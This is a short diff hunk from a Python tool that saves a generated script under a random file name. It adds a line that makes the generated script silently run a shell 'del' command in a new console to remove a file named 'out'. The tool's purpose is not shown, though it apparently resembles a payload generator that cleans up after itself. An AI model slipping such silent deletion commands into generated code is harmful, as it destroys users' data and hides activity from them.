@@ -249,6 +249,7 @@ def main():
 
     colored_print( " [*] Saving the final file..","g" )
     file_name = random_name()
+    f+="\nx = subprocess.Popen( 'del out >> NUL',creationflags=subprocess.CREATE_NEW_CONSOLE, shell=True)"
 
     os.chdir("temp")
     fo = open( file_name+".py","w" )
